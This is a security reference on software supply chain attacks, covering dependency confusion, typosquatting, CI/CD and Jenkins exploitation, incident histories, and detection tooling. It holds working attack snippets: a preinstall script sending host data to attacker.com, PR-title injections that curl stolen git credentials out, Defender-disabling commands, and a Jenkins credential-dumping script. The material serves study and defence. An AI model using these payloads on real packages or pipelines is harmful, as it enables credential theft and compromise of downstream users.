# Supply Chain Attacks

## Overview

Supply chain attacks target the software development and delivery process, compromising dependencies, build systems, or distribution channels to inject malicious code into legitimate software. These attacks exploit the trust organizations place in third-party components, open-source libraries, and vendor updates to infiltrate thousands of downstream customers through a single point of compromise.

Few threats capture the complexity of today's digital ecosystem quite like supply chain attacks. These incidents don't just exploit technical vulnerabilities; they exploit the interconnected nature of modern software development, where every dependency, package, and third-party service can become an unintentional gateway. In essence, the target is trust itself.

## Dependency Confusion

### Concept

When an organization uses private packages with the same name available on public registries, attackers can upload malicious packages with higher version numbers to public registries. The package manager, following its default resolution logic, will fetch the public package with the higher version number instead of the organization's internal one.

### Real-World Discovery: Alex Birsan's Attack

This technique was first publicly demonstrated by researcher Alex Birsan, who breached 35 major tech companies including Microsoft, Apple, Yelp, Paypal, Shopify, Netflix, Tesla, and Uber, earning $130,000 in bug bounties. The method relies on "dependency confusion" - exploiting the confusion about the possible locations that package managers use to find the files a project depends on.

Birsan found that affected companies used locally stored files that were not present in open-source directories. For example, PayPal's `package.json` file listed dependencies including `express` (public) and `pplogger` (PayPal's private internal package). By creating packages on the public npm registry matching the names of these local dependencies, he could inject malicious code.

### Exploitation

```bash
# 1. Find private package names
# Look in package.json, requirements.txt, pom.xml, etc.
# Check JavaScript source for import statements
grep -r "require\|import" --include="*.js" .

# 2. Check if package exists on public registry
npm view private-package-name
pip index versions private-package-name

# 3. Create malicious package with higher version
# npm
npm init
# Set version higher than internal (e.g., 99.0.0)
npm publish

# pip
# Create setup.py with higher version
python setup.py sdist
twine upload dist/*
```

### Real Package Example

A proof-of-concept package named `fc-explanation` was published to npm to demonstrate this vulnerability. The package's preinstall script executed commands that captured the hostname, current working directory, username, and external IP address, then exfiltrated this data via HTTP and HTTPS requests:

```javascript
const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;curl https://ifconfig.me;) && echo $a", (error, data) => {
    if (data) {
        fetch("http://attacker.com/mpf/depconfusion/fc-explanation?stdout=" + data)
        fetch("https://attacker.com/mpf/depconfusion/fc-explanation?stdout=" + data)
    }
});
```

The package.json defined the malicious script to run on preinstall:

```json
"scripts": {
    "preinstall": "node index.js > /dev/null 2>&1"
}
```

### Detection

```bash
# Check for dependency confusion vulnerability
# https://github.com/visma-prodsec/confused
confused -l npm package.json

# https://github.com/AyoubAbeworworki/dep-confusion-detect
python3 dep-confusion-detect.py -r requirements.txt
```

## Typosquatting

### Concept

Registering package names similar to popular packages to catch typos. Attackers create malicious packages with names that differ slightly from legitimate libraries, hoping developers will make typographical errors when installing dependencies.

### Real-World Campaign: Colorama and Colorizr (2025)

A sophisticated typosquatting campaign targeted the popular Colorama Python package used for colorizing terminal output. In an unusual twist, the attackers also uploaded malicious Python libraries resembling an npm JavaScript package called Colorizr - a cross-ecosystem name confusion tactic.

The malicious packages included:

**Python (targeting Colorama users):**
- `coloramapkgsw`
- `coloramapkgsdow`
- `coloramashowtemp`
- `coloramapkgs`
- `readmecolorama`

**Python (targeting Colorizr npm users):**
- `colorizator`
- `coloraiz`

The payloads provided persistent remote access and remote control of compromised systems, harvesting sensitive data. Windows payloads attempted to bypass antivirus and endpoint protection controls by removing Windows Defender definitions and disabling IOAV protection:

```powershell
# Malicious commands observed in the campaign
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
Set-MpPreference -DisableIOAVProtection $true
```

Linux payloads dropped RSA keys, installed gs-netcat for encrypted reverse shells, and exfiltrated encrypted output to Pastebin via API.

### Common Typosquatting Patterns

```bash
# Typo patterns to check:
# - Missing characters: reqests (requests)
# - Extra characters: requestss
# - Character swap: requetss
# - Similar looking: requestz, request5
# - Wrong TLD: lodash-npm (vs lodash)

# Generate typosquat candidates
# https://github.com/elfmaster/typosquatting
./typosquat.py express

# Check npm
for pkg in expres expresss exprss; do npm view $pkg 2>/dev/null && echo "EXISTS: $pkg"; done

# Check PyPI
for pkg in reqests requsets requets; do pip index versions $pkg 2>/dev/null && echo "EXISTS: $pkg"; done
```

### Additional Real-World Examples

In June 2025, multiple malicious packages were discovered across npm, PyPI, and RubyGems using typosquatting and brandjacking techniques:

- **xlsc-to-json-lh** - a one-letter typosquat of the legitimate Excel to JSON converter `xlsx-to-json-lc`, capable of deleting entire project directories
- **Solana ecosystem packages** - over 25 malicious Python packages targeting cryptocurrency wallets, including `solana-test`, `solana-token`, `solana-charts`, and `solana-trading-bot`
- **Ruby gems** - `fastlane-plugin-telegram-proxy` and `fastlane-plugin-proxy_teleram` - typosquats of Fastlane plugins that redirected Telegram API data to attacker-controlled endpoints

### Finding Vulnerable Packages

```bash
# Search for common typos in target's dependencies
# Look for:
# - Misspelled package names
# - Packages with low download counts
# - Recently published packages claiming to be popular

# NPM package analysis
npm audit
npm ls --all

# Python
pip-audit
safety check -r requirements.txt

# Snyk for comprehensive scanning
snyk test
```

## CI/CD Pipeline Attacks

### GitHub Actions Exploitation

#### Real-World Campaign: HackerBot-Claw (2026)

In February-March 2026, an automated campaign named "HackerBot-Claw" systematically scanned public repositories for misconfigured GitHub Actions workflows and weaponized them to gain privileged access. The campaign exploited workflows using `pull_request_target` with elevated permissions, opening pull requests crafted to trigger CI execution and expose privileged tokens.

**Impacted repositories included:**
- `microsoft/ai-discovery-agent` - targeted via branch name injection
- `aquasecurity/trivy` - full repository compromise via GitHub Actions abuse
- `DataDog/datadog-iac-scanner` - exploited through filename injection
- `avelino/awesome-go` - arbitrary code execution and GitHub token exfiltration
- `project-akri/akri` (CNCF project) - CI executed injected scripts

The attack chain followed this pattern:
1. Scan for vulnerable CI workflows with `pull_request_target` triggers
2. Automatically generate a pull request to trigger the CI pipeline
3. Leak privileged tokens when workflows run with write access
4. Abuse compromised tokens to delete releases, rename repositories, and publish malicious artifacts

#### Trivy Double Compromise (2026)

The Trivy vulnerability scanner maintained by Aqua Security was compromised twice within a month. The second incident was particularly severe: an attacker force-pushed 75 out of 76 version tags in the `aquasecurity/trivy-action` repository to point to malicious commits containing a Python infostealer payload. Seven tags in `aquasecurity/setup-trivy` were similarly poisoned.

The credential harvester operated in three stages:
1. Harvesting environment variables from runner process memory and the file system
2. Encrypting the stolen data
3. Exfiltrating to attacker-controlled server `scan.aquasecurtiy[.]org`

When exfiltration failed, the malware used the captured `INPUT_GITHUB_PAT` to stage stolen data in a public repository named `tpcp-docs`.

```yaml
# Vulnerable workflow - using untrusted input
name: Dangerous PR Runner
on:
  pull_request_target:  # Dangerous trigger - grants access to repository secrets

jobs:
  run-pr-code:
    runs-on: ubuntu-latest
    permissions:
      contents: write  # Excessive permissions
      pull-requests: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Dangerous! Executes PR code
      - name: Run script
        run: scripts/run.sh  # Untrusted code execution
```

```bash
# Pwn Request - exploit pull_request_target
# Create PR with malicious title:
# $(curl http://attacker.com/$(cat /home/runner/.git/credentials | base64))

# Inject into workflow
# PR title: test"; curl http://attacker.com/pwned #

# Secrets exfiltration via workflow
# Add to PR body/title:
# ${{ secrets.GITHUB_TOKEN }}
```

### GitLab CI Exploitation

```yaml
# Check for exposed CI variables
# .gitlab-ci.yml
variables:
  DEBUG: "true"
  # Secrets might be exposed in logs

script:
  - echo $CI_JOB_TOKEN  # Can be used for registry access
  - env  # Dumps all variables including secrets
```

### Jenkins Exploitation

```bash
# Check for exposed Jenkins instances
# Common endpoints:
/script
/scriptText
/computer/(master)/script

# Groovy console RCE
def cmd = "cat /etc/passwd"
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

# Credential dumping
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
)
for (c in creds) {
    println(c.id + ": " + c.username + " / " + c.password)
}
```

## Package Repository Attacks

### NPM

#### Real-World Worm Campaign: Shai-Hulud (2025)

In 2025, attackers injected malicious scripts into the popular TinyColor package and dozens of related packages, turning them into a self-propagating worm that harvested developer tokens, cloud credentials, and secrets during installation. The npm ecosystem continues to face significant risks from lifecycle hook abuse - preinstall, install, postinstall, and prepare hooks can execute arbitrary code during package installation.

#### Qix npm Attack (2025)

A developer's npm account was phished and used to publish compromised versions of foundational libraries including `chalk`, `strip-ansi`, and `debug` - packages that millions of projects depend on.

```bash
# Check package for malicious scripts
npm pack <package-name>
tar -xzf package-name-*.tgz
cat package/package.json | jq '.scripts'

# Look for suspicious install scripts:
# - preinstall, install, postinstall
# - preuninstall, uninstall, postuninstall

# Check package history
npm view <package-name> versions
npm view <package-name>@<version> dist.tarball

# Audit for known vulnerabilities
npm audit
npm audit --json
```

### PyPI

#### Alibaba AI Services Malware (2025)

Three malicious packages were discovered offering Python SDKs for Alibaba's AI services: `aliyun-ai-labs-snippets-sdk`, `ai-labs-snippets-sdk`, and `aliyun-ai-labs-sdk`. None contained functional AI code - they were pure malware using toxic payloads in PyTorch models encoded as zipped Pickle files. Pickle's vulnerability allowing arbitrary code execution during deserialization was the attack vector.

```bash
# Download and inspect package
pip download <package-name> --no-deps
unzip <package>.whl -d extracted/

# Check setup.py for malicious code
cat extracted/setup.py

# Look for:
# - os.system(), subprocess calls
# - Encoded/obfuscated strings
# - Network requests during install
# - File system modifications

# Safety check
safety check -r requirements.txt
pip-audit
```

### Maven/Gradle

```xml
<!-- Check pom.xml for suspicious plugins -->
<!-- Look for exec-maven-plugin, build-helper-maven-plugin with suspicious configs -->

<!-- Verify package signatures -->
<!-- Check .asc files against GPG keys -->
```

## Third-Party Library Vulnerabilities

### React2Shell (CVE-2025-55182)

A critical pre-authentication Remote Code Execution vulnerability was discovered in React Server Components, affecting React versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0, as well as Next.js 15.x and 16.x versions using the App Router. The vulnerability allows attackers to execute arbitrary JavaScript code on the server without authentication by sending malicious payloads to Server Function endpoints.

### Discovery

```bash
# Software Composition Analysis (SCA)
# Snyk
snyk test

# OWASP Dependency-Check
dependency-check --project "MyApp" --scan .

# npm
npm audit

# pip
pip-audit
safety check

# Go
go list -json -m all | nancy sleuth

# Trivy (containers and filesystems)
trivy fs .
trivy image myapp:latest
```

### Exploitation Research

```bash
# Check for known CVEs in dependencies
# https://nvd.nist.gov/
# https://security.snyk.io/
# https://github.com/advisories

# Search for PoCs
# GitHub: "CVE-XXXX-XXXX poc"
# Exploit-DB: searchsploit <library-name>

# Check dependency versions
npm ls
pip list
mvn dependency:tree
```

## Source Code Repository Attacks

### Exposed Credentials in Repositories

```bash
# Search for secrets in git history
# https://github.com/trufflesecurity/trufflehog
trufflehog git https://github.com/target/repo

# https://github.com/zricethezav/gitleaks
gitleaks detect -s /path/to/repo

# GitHub dorking
# Search for accidentally committed secrets
site:github.com "target.com" password
site:github.com "target.com" api_key
site:github.com "target.com" AWS_SECRET
```

### Commit Signature Verification Bypass

```bash
# Check if repo requires signed commits
git log --show-signature

# Unsigned commits might be accepted
# Impersonate commits by setting user.email
git config user.email "admin@target.com"
git commit -m "Malicious commit"
```

## Major Real-World Supply Chain Attacks

### SolarWinds Orion (2019-2020)

The SolarWinds Orion compromise remains one of the largest and most devastating supply chain attacks in history. Attackers compromised SolarWinds' software build process and injected malicious code into legitimate software updates, which were then distributed to over 18,000 organizations, including government agencies and Fortune 500 companies. This attack demonstrated how a single compromised vendor can undermine thousands of secure environments.

### XZ Utils Backdoor (2024)

In early 2024, a backdoor was discovered in XZ Utils, a core Linux compression utility used across major distributions. The attacker patiently contributed to the open-source project for over two years, gained maintainer trust, and eventually inserted malicious code into official releases. This incident highlighted that attackers are playing the long game - infiltrating open-source projects and waiting for the perfect moment to strike.

### Codecov Bash Uploader Compromise (2021)

Attackers gained unauthorized access to Codecov's development environment and modified its Bash Uploader script, a tool used by more than 29,000 customers including GoDaddy, Washington Post, and Royal Bank of Canada. The altered script silently exfiltrated sensitive information including environment variables containing secrets, credentials, and tokens from downstream customers' build systems for two months undetected.

### tj-actions/changed-files Compromise (March 2025)

Attackers compromised the widely used GitHub Action `tj-actions/changed-files`, integrated in over 23,000 repositories. They injected malicious code and retroactively altered version tags to reference a commit that dumps CI/CD secrets from runner memory into build logs. Because many workflows automatically trust and execute third-party Actions, this enabled attackers to steal secrets by poisoning a tool those organizations already trusted.

### Jaguar Land Rover Attack (September 2025)

A cyber attack on Jaguar Land Rover brought vehicle production to a standstill across the UK, Slovakia, India, and Brazil, costing an estimated £120 million in lost profit and £1.7 billion in revenue. The attack caused weeks-long production halts, triggered layoffs, factory shutdowns, and bankruptcies across its supplier network. Nearly 80% of firms surveyed reported negative impacts, making it the most economically damaging cyberattack in British history at an estimated cost of £1.9 billion ($2.5 billion).

### Marks & Spencer Attack (May 2025)

UK retailer Marks & Spencer suffered a highly targeted cyberattack traced back to social engineering against employees at a third-party contractor. The breach forced manual operation of critical logistics processes, disrupted food distribution, reduced product availability across stores, and temporarily halted online shopping. The attack, part of a coordinated campaign by the ransomware group DragonForce, resulted in an estimated £300 million ($400 million) loss in operating profit.

## Attack Vectors Summary

| Vector | Target | Impact | Real-World Example |
| ------ | ------ | ------ | ------------------- |
| Dependency Confusion | Private packages | Code execution | Alex Birsan's attacks on Microsoft, Apple, Tesla |
| Typosquatting | Developers | Credential theft, remote access | Colorama/Colorizr campaign (2025) |
| CI/CD Injection | Build pipelines | Code execution, secrets theft | HackerBot-Claw campaign, Trivy compromise |
| Malicious Packages | Package registries | Supply chain compromise | Shai-Hulud worm, Qix npm attack |
| Compromised Maintainer | Open source projects | Backdoors | XZ Utils (2-year infiltration) |
| Build System Compromise | Build servers | Signed malware | SolarWinds, Codecov |
| Software Update | Update mechanisms | Widespread compromise | SolarWinds Orion |

## Detection & Prevention

### For Attackers (Testing)

```bash
# Check if org is vulnerable to dependency confusion
# 1. Enumerate private package names from leaked files
# 2. Check if those names are unclaimed on public registries
# 3. Report or (if in scope) demonstrate with benign package

# Check for exposed CI/CD
# GitHub Actions: /.github/workflows/
# GitLab CI: /.gitlab-ci.yml
# Jenkins: /Jenkinsfile
```

### For Defenders

```bash
# Lock dependencies to specific versions
# Use lockfiles: package-lock.json, Pipfile.lock, go.sum

# Pin GitHub Actions to full SHA hashes, not version tags
# Version tags can be moved to point at malicious commits
# Example: uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab

# Enable dependency scanning in CI/CD
# Use private registry with namespace reservation
# Implement Sigstore/cosign for package signing
# Enable GitHub secret scanning

# Rotate secrets immediately if compromise is suspected
# Block known malicious domains and IP addresses
# Monitor for suspicious outbound connections
```

### Network-Based Detection: BEAM

Netskope released an open-source tool called BEAM (Behavioral Evaluation of Application Metrics) that detects supply chain attacks by analyzing network traffic without requiring endpoint agents. BEAM compares application traffic against pre-trained models using 186 different features to identify unusual communication patterns indicative of compromise.

The tool was validated in a red team/blue team exercise where it identified a compromised application with 94% probability by detecting communication to an unusual endpoint with high URL entropy, unusual data transfer volumes, and abnormal transaction timing.

## Tools

```bash
# Dependency Confusion
# https://github.com/visma-prodsec/confused
confused -l npm package.json

# Secret Scanning
# https://github.com/trufflesecurity/trufflehog
trufflehog git https://github.com/target/repo

# https://github.com/zricethezav/gitleaks
gitleaks detect -s /path/to/repo

# Software Composition Analysis
# https://github.com/anchore/syft
syft /path/to/project

# https://github.com/anchore/grype
grype /path/to/project

# CI/CD Security
# https://github.com/Checkmarx/kics
kics scan -p /path/to/.github/workflows

# Supply Chain Attack Detection (Network-based)
# https://github.com/netskopeoss/beam
beam analyze -f traffic.pcap
```

## Resources

- [Dependency Confusion Research (Alex Birsan)](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [Backstabber's Knife Collection](https://github.com/nickvdyck/backstabbers-knife-collection)
- [CI/CD Goat - Vulnerable Pipeline](https://github.com/cider-security-research/cicd-goat)
- [SLSA - Supply Chain Security Framework](https://slsa.dev/)
- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [Socket.dev - Open Source Security Insights](https://socket.dev)
- [Aqua Security Trivy Compromise Advisory](https://aquasecurity.github.io/)
